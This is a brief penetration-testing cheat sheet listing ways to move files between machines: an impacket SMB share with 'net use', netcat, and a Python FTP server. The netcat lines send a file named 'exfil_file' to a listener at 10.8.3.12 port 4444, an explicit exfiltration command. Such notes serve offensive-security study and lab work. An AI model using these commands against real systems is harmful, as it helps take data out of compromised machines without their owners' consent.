**SMB :**
- Linux machine: 
```sh
smbserver.py smb share/ -smb2support
```

- Windows machine: 
```sh
net use \\ip\smb
```

**NC :**
```sh
nc -lvnp 4444 > new_file #receving machine
nc.exe -vn 10.8.3.12 4444 < exfil_file #sending machine
```

**FTP :** 
```sh
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

